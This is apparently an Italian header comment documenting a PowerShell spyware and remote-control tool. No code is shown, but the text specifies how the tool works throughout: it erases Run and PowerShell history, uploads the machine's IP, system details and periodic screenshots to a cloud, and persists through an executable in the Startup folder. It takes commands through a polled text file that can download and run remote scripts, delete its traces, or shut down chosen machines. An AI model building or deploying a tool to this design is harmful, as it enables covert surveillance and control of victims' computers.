# ================================================================================================================== #

 FUNZIONALITÀ:
  - cancella cronologia esegui e cronologia powershell
  - carica un file con l'indirizzo ip del dispositivo
  - carica un file con alcune informazioni sul dispositivo
  - carica ogni "interval" secondi lo screenshot dello schermo
  - controllo ogni "command_control" screenshot un file .txt di comando

# ================================================================================================================== #

 FILE DI SUPPORTO:
  - file .json di configurazione per impostare il programma appena avviato
  - file .txt di comando per gestire il programma durante l'esecuzione
  - file .exe salvato nella cartella di startup che esegue il programma all'avvio del computer

# ================================================================================================================== #

 COMANDI:
  - startScreen: avvia l'operazione di creazione e salvataggio screenshot
  - pauseScreen: mette in pausa l'operazione di creazione e salvataggio sreenshot
  - stopScript: termina l'esecuzione del programma
  - clearFiles: elimina tutti i file del programma contenuti nel computer
  - runCode: esegue un file esterno tramite un job in asincrono
	    - <nomeFile>: scarica il file <nomeFile> dalla cartella scripts del cloud
	    - numberCode <n>: scarica il file dall'n-esimo url del file .json
  - offPC: spegne il computer
  - restartPC: riavvia il computer

# ================================================================================================================== #

 SINTASSI COMANDI: <destinatario> <comando> <n>
  - destinatario: nome del computer a cui far eseguire il comando
	    - NOME-ES: solo il computer NOME-ES
	    - !NOME-ES: tutti i computer eccetto NOME-ES
	    - ALL: ogni dispositivo
  - comando: comando da eseguire
  - n: quante volte eseguire il comando
	    - n > 0: il comando viene eseguito n volte e al termine il file .txt viene sovrascritto da un file vuoto
	    - n = 0 o "": il comando viene eseguito all'infinito

# ================================================================================================================== #
